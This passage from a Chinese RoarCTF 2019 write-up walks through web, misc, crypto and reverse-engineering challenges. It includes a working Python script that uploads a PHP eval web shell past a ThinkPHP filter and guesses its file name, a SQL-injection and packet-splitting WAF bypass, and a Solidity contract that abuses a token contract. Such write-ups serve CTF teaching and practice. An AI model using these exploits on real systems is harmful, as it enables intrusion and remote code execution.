+然后拿到假flag：`flag{G1zj1n_W4nt5_4_91r1_Fr1end}`
+
+第二行记录才是真flag：`RoarCTF{wm-fb3a5c2a0093f22a}`
+
+###  simple_upload
+
+`thinkphp` 的上传demo，`allowExts` 没啥用，其它格式的文件也能上传。
+
+不过限制了`.php`，仔细看才发现，只有 `$_FILES['file']` 做了限制，所以上传多个文件就能绕过了。
+
+然后文件名默认根据 `uniqid` 生成，同时上传文件，挺相近的，可以爆破一下。
+
+附上上传和爆破文件名的脚本：
+
+    
+    
+    import requests
+    
+    url = "http://***.4hou.com.cn:34133"
+    
+    path = url + "/index.php/home/index/upload"
+    files = {"file":("a.txt",'a'), "file1":("a.php", '<?php eval($_GET["a"]);')}
+    r = requests.post(path, files=files)
+    t1 = r.text.split("/")[-1].split(".")[0]
+    print t1
+    t1 = int(t1, 16)
+    print t1
+    
+    j = t1
+    while True:
+        path = url + "/Public/Uploads/2019-10-13/%s.php" % hex(j)[2:-1]
+        try:
+            r = requests.get(path, timeout=1)
+        except:
+            continue
+        if r.status_code != 404:
+            print path
+            print r.text
+            break
+        print j, hex(j)[2:-1], r.status_code
+        j -= 1
+    
+
+直接能拿到flag。
+
+###  dist
+
+前端源码提供了 `sourceMapping`，在 `webpack:///./src/config.js` 里找到源码包。
+
+    
+    
+    // my source code backup:
+    // /backup-for-debug.7z
+    
+
+后端用 `go` 写的，审计了一下，在 `route/auth.go` 里找到一段。
+
+    
+    
+        // double insurance
+        // also protected by WAF
+        for _, w := range []string{"delete", "insert", "update"} {
+            if strings.Contains(strings.ToLower(j.Uname), w) {
+                c.JSON(200, Msg{-1, "something wrong", nil})
+                return
+            }
+        }
+    
+        // may be SQLi here
+        // but dont worry, baby hackers cant break my waf
+        rows, err := DB.Query(fmt.Sprintf("SELECT pwd FROM users WHERE uname='%s';", j.Uname))
+        if err != nil {
+            c.JSON(200, Msg{-1, err.Error(), nil})
+            return
+        }
+        defer rows.Close()
+    
+
+登录时用户名拼接，存在注入，但是过滤了关键词，而且还有waf（`waf/main.go`）。
+
+    
+    
+    func tcpWaf(server net.Conn, client net.Conn) bool {
+        defer func() {
+            recover()
+        }()
+        buf := make([]byte, 4*1024)
+    
+        for {
+            nr, er := client.Read(buf)
+            dataS := bytes.Split(buf[:nr], []byte{13, 10, 13, 10})
+    
+            // get the request body
+            // split by CRLFCRLF
+            data := bytes.Join(dataS[1:], []byte(""))
+    
+            for _, word := range WAFWORD {
+                if strings.Contains(strings.ToLower(string(data)), word) {
+                    client.Write([]byte("HTTP/1.1 200rnServer: iWAF/0.0.1rnrninterceptedrnrn"))
+                    return false
+                }
+            }
+            if nr > 0 {
+                nw, ew := server.Write(buf[0:nr])
+                if ew != nil {
+                    break
+                }
+                if nr != nw {
+                    break
+                }
+            }
+            if er != nil {
+                break
+            }
+        }
+        return true
+    }
+    
+
+此处waf可绕过。它以 `rnrn` 分割包，取后面的进行waf过滤，所以建立tcp socket，分包发，就能绕过过滤。
+
+然后可以注入得到 `secret表secret字段` 的内容，用来构造 `cookie`，这样就能登录 `admin` 账号了。
+
+然后审了很久都没审出来如何利用。后来放了提示 `Go slice feature`，网上找到相同的利用点。
+
+[Teaser CONFidence CTF 2019 “The Lottery”
+Writeup](https://www.jianshu.com/p/2e3f0018b0d6)
+
+同样的利用方法。
+
+伪造cookie登录admin，start启动casino。然后注册一个普通账号，beg 3次，join 进去 pending
+list。回到管理员，addplayer将这个普通账号添加到formal
+player。回到普通账号，再beg一次。等5分钟后这一轮casino结束，普通账号查看个人info，就能看到flag。
+
+## Misc
+
+###  黄金六年
+
+首先将文件解压出来得到一个 mp4 的压缩包，常规思路使用 binwalk 分析一下，没有发现什么
+
+![](https://p3.ssl.qhimg.com/dm/1024_150_/t01116c047c46aa35e0.png)
+
+strings 分析字符串，发现有一段 base64 编码的字符
+
+![](https://p0.ssl.qhimg.com/dm/1024_364_/t01d9ec54334cc747ca.png)
+
+尝试进行 base64 解码，会发现是 rar 的压缩包文件
+
+![](https://p3.ssl.qhimg.com/dm/1024_452_/t01b23653cb867fb438.png)
+
+提取到本地，尝试进行解压发现需要密码
+
+![](https://p0.ssl.qhimg.com/t01f4f0cae2cb42bf39.png)
+
+在视频中尝试寻找密码，使用 imovie 打开视频文件，在寻找关键帧的时候会发现二维码
+
+![](https://p2.ssl.qhimg.com/dm/1024_454_/t016e7bbe1133c7294e.png)
+
+总共可以发现四个二维码，扫码之后拼接 key 得到：iwantplayctf
+
+最后解压就得到 flag
+
+![](https://p0.ssl.qhimg.com/t01f34f4662a4aa41aa.png)
+
+flag：roarctf{CTF-from-RuMen-to-RuYuan}
+
+###  TankGame
+
+下载以后发现是一个unity 3D的游戏，直接去找Assembly-CSharp.dll文件，用ILspy反编译一下C#的代码，各个函数如下图所示：
+
+![](https://s2.ax1x.com/2019/10/14/KS4Dns.png)
+
+在MapManager可以看到地图和flag的生成条件为Destroynum==4或者Destroynum==5时：
+
+![](https://s2.ax1x.com/2019/10/14/KS4cNV.png)
+
+地图和游戏的地图是一一对应的，空是8，基地是0，水是4，草地是5，砖块是1
+
+![](https://s2.ax1x.com/2019/10/14/KS4ghT.png)
+
+在bullect这个类里可知，砖头和基地可被破坏，破坏后基地会变为9，砖块会变为空也就是8，子弹只有击中砖块或者基地时DestroyNum才会增长，所以直接编写代码爆破DestroyNum为4或者为5时的所有情况。
+
+![](https://s2.ax1x.com/2019/10/14/KS4s7q.png)
+
+    
+    
+    str1 = str1.replace("0","9")
+    for i in range(len(x)):
+        for j in range(i+1, len(x)):
+            for k in range(j+1, len(x)):
+                str2 = str1[:x[i]] + '8' + str1[x[i]+1:x[j]] + '8' + str1[x[j]+1:x[k]] + '8' + str1[x[k]+1:]
+                result = hashlib.sha1(str2).hexdigest()
+                if result == "3f649f708aafa7a0a94138dc3022f6ea611e8d01":
+                    print str2
+    
+
+结果为:
+
+    
+    
+    clearlove9888888888888888888845811111188884882888851888181848858288881884811588888248118818515888885881588881888888188888888181588188188114888881884188518888842888118582851488815189148888888888888811818821885218888888848821182181888118844884248488884881288881881818811588888888188888811528888888828888481828158848888882818818818225888218888284581125888888888888888888
+    
+
+编写脚本并使用程序内置的MD5函数得到结果如下图所示：
+
+![](https://s2.ax1x.com/2019/10/14/KS4rBn.png)
+
+###  forensic
+
+发现是内存取证，使用Volatility内存取证神器。
+
+首先收集一下信息，在使用mftparser插件时发现了flag.zip 和 flag.rar
+
+`volatility -f mem.raw --profile=Win7SP1x86 mftparser > mft.txt`
+
+内容很多，随查找了一下flag关键字。
+
+![](https://tva1.sinaimg.cn/large/006y8mN6ly1g7xxiekk7jj313w08w0sr.jpg)
+
+继续查找flag关键字，找到了flag.zip 和 flag.rar 的十六进制 dump 下来
+
+![](https://tva1.sinaimg.cn/large/006y8mN6ly1g7xxiz3jjuj30vp0htdh3.jpg)
+
+在压缩包里发现了flag.txt，接下来思路是找到 压缩包的密码
+
+首先简单看了下图片。
+
+`volatility -f mem.raw --profile=Win7SP1x86 filescan | grep "png|jpg|jpeg"`
+
+filesacn发现在我的文档，图片，文件夹里，有张图片 ，dumpfiles 下来就是flag.zip 的密码，成功拿到flag
+
+![](https://tva1.sinaimg.cn/large/006y8mN6ly1g7xx6k8uvej30n106m3yb.jpg)
+
+在剪贴板中还发现了百度云链接，`https://pan.baidu.com/s/12hQlubfkvdQhASi0dWs_5Q`
+
+![](https://tva1.sinaimg.cn/large/006y8mN6ly1g7xxq94ixbj30lu03f743.jpg)
+
+后续很多步骤 最后并没有和flag.zip 串起来，就不细说了
+
+## Crypto
+
+###  CoinFlip
+
+给了一个ropsten测试链的地址
+
+<https://ropsten.etherscan.io/address/0xF60ADeF7812214eBC746309ccb590A5dBd70fc21>
+
+查看智能合约代码,
+
+只要循环调用Ap()和Transfer()500次就能getflag.
+
+但是有gas限制,分成5次提交.
+
+    
+    
+    contract attack {
+        address attacker ;
+        function attack()  {attacker = msg.sender;}
+    
+        function start(address victim,address receive)  {
+    
+            for (uint i = 1; i <= 100; i++) {
+                victim.call(bytes4(keccak256("Ap()")));
+                victim.call(bytes4(keccak256("Transfer(address,uint256)")),receive, 1000000000000000000);
+            }
+        }
+    }
+    
+
+领取测试币,编译后deploy到测试区块.
+
+transact5次,我这里交易了不止五次..
+
+![](https://s2.ax1x.com/2019/10/14/KSeqrF.png)
+
+再compile ,deploy 题目的智能合约.看下余额,大于500就可以拿flag了.
+
+![](https://s2.ax1x.com/2019/10/14/KSmS8x.png)
+
+提交base64编码的email地址,
+
+![](https://s2.ax1x.com/2019/10/14/KSm0LF.png)
+
+###  babyRSA
+
+使用wilson定理得到余数，之后把n分解为三个素数解密文
+
+    
+    
+    from gmpy2 import *
+    import sympy,libnum
+    A1=21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467234407
+    B1=21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467140596
+    A2=16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858418927
+    B2=16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858351026
+    n=85492663786275292159831603391083876175149354309327673008716627650718160585639723100793347534649628330416631255660901307533909900431413447524262332232659153047067908693481947121069070451562822417357656432171870951184673132554213690123308042697361969986360375060954702920656364144154145812838558365334172935931441424096270206140691814662318562696925767991937369782627908408239087358033165410020690152067715711112732252038588432896758405898709010342467882264362733
+    e=0x1001
+    c=38620963949231568493951852806812359956058522979245676395704780066879051018892175913415575431734194586035432099562300809271498658506900105389975586615280808081596988894713047252672924018208747721253303054480800386069769084714127190055658807083226038640292692679215406182331245636616583141043207599068234065117886147748321058731290102675088056205224134057176167818706519201527516421824645801542347535393294450756726281744763656819345306146716190523210020241675468
+    def wilson(A,B):
+        P = 1
+        while (B<=A-2):
+            P*=B
+            P%=A
+            B+=1
+        return P
+    p = sympy.nextprime(invert(wilson(A1,B1+1),A1))
+    q = sympy.nextprime(invert(wilson(A2,B2+1),A2))
+    r = n/q/p
+    phi = (p-1)*(q-1)*(r-1)
+    d = invert(e,phi)
+    m = pow(c,d,n)
+    print m
+    print libnum.n2s(m)
+    
+
+![](https://s2.ax1x.com/2019/10/14/KSog4P.png)
+
+###  RSA
+
+n可以直接分解，脚本如下：
+
+    
+    
+    n = 117930806043507374325982291823027285148807239117987369609583515353889814856088099671454394340816761242974462268435911765045576377767711593100416932019831889059333166946263184861287975722954992219766493089630810876984781113645362450398009234556085330943125568377741065242183073882558834603430862598066786475299918395341014877416901185392905676043795425126968745185649565106322336954427505104906770493155723995382318346714944184577894150229037758434597242564815299174950147754426950251419204917376517360505024549691723683358170823416757973059354784142601436519500811159036795034676360028928301979780528294114933347127
+    c = 86974685960185109994565885227776590430584975317324687072143606337834618757975096133503732246558545817823508491829181296701578862445122140544748432956862934052663959903364809344666885925501943806009045214347928716791730159539675944914294533623047609564608561054087106518420308176681346465904692545308790901579479104745664756811301111441543090132246542129700485721093162972711529510721321996972649182594310700996042178757282311887765329548031672904349916667094862779984235732091664623511790424370705655016549911752412395937963400908229932716593592702387850259325784109798223415344586624970470351548381110529919234353
+    q=139916095583110895133596833227506693679306709873174024876891023355860781981175916446323044732913066880786918629089023499311703408489151181886568535621008644997971982182426706592551291084007983387911006261442519635405457077292515085160744169867410973960652081452455371451222265819051559818441257438021073941183
+    p=842868045681390934539739959201847552284980179958879667933078453950968566151662147267006293571765463137270594151138695778986165111380428806545593588078365331313084230014618714412959584843421586674162688321942889369912392031882620994944241987153078156389470370195514285850736541078623854327959382156753458569
+    e=65537
+    d=invert(e,(p-1)*(q-1))
+    m = pow(c,d,n)
+    print m
+    print libnum.n2s(m)
+    
+
+![](https://s2.ax1x.com/2019/10/14/KSojvF.png)
+
+## RE
+
+###  polyre
+
+使用 ida 载入后发现是控制流平坦化
+
+![](https://i.loli.net/2019/10/14/cAW9exoR3DaZrGC.png)
+
+参考  
+<https://paper.seebug.org/192/>
+
+使用 angr 进行化简，得到关键算法。  
+  
+程序两个循环，外层循环六次，每次拿 8 个字节，内层循环 64 次，进行加密。
+
+加密伪代码:
+
+    
+    
+    i=0
+    #x=?
+    while(i<64):
+        if x>=0:
+            x=x<<1
+        else:
+            x=(x<<1)^0xB0004B7679FA26B3
+        i=i+1
+    
+
+exp:
+
+    
+    
+    #include<cstdio>
+    char encode[48] = { 0x96, 0x62, 0x53, 0x43, 0x6D, 0xF2, 0x8F, 0xBC, 0x16, 0xEE,0x30, 0x05, 0x78, 0x00, 0x01, 0x52, 0xEC, 0x08, 0x5F, 0x93,
+              0xEA, 0xB5, 0xC0, 0x4D, 0x50, 0xF4, 0x53, 0xD8, 0xAF, 0x90,
+              0x2B, 0x34, 0x81, 0x36, 0x2C, 0xAA, 0xBC, 0x0E, 0x25, 0x8B,
+              0xE4, 0x8A, 0xC6, 0xA2, 0x81, 0x9F, 0x75, 0x55 };
+    int main() {
+        long long* e = (long long*)encode;
+        for (size_t i = 0; i < 6; i++)
+        {
+            printf("%llxn", e[i]);
+        }
+        printf("n");
+        for (int i = 0; i < 6; i++) {
+            for (size_t j = 0; j < 64; j++)
+            {
+                if (!(e[i]&1) ) { e[i]= (unsigned long long) e[i]>> 1;}
+                else {
+                    e[i] = ((unsigned long long)e[i] ^ 0xB0004B7679FA26B3) >> 1;
+                    e[i] |= 0x8000000000000000;
+                }
+            }
+        }
+        for (size_t i = 0; i < 48; i++)
+        {
+            printf("%c", encode[i]);
+        }
+    }
+    
+
+本文翻译自 [原文链接]()。如若转载请注明出处。
+
+商务合作，文章发布请联系 anquanke@360.cn
+
+本文由 **星盟安全团队** 原创发布
+
+转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
+[https://www.anquanke.com/post/id/188785](/post/id/188785)
+
+安全客 - 有思想的安全新媒体
+
+本文转载自: []()
+
+如若转载,请注明出处： []()
+
+安全客 - 有思想的安全新媒体
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
+  * [CTF](/tag/CTF)
+  * [Roarctf](/tag/Roarctf)
+
+ **+1** __18赞
+
+ __收藏
+
+![](https://p3.ssl.qhimg.com/t0194c173898acf47c6.png) 星盟安全团队
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
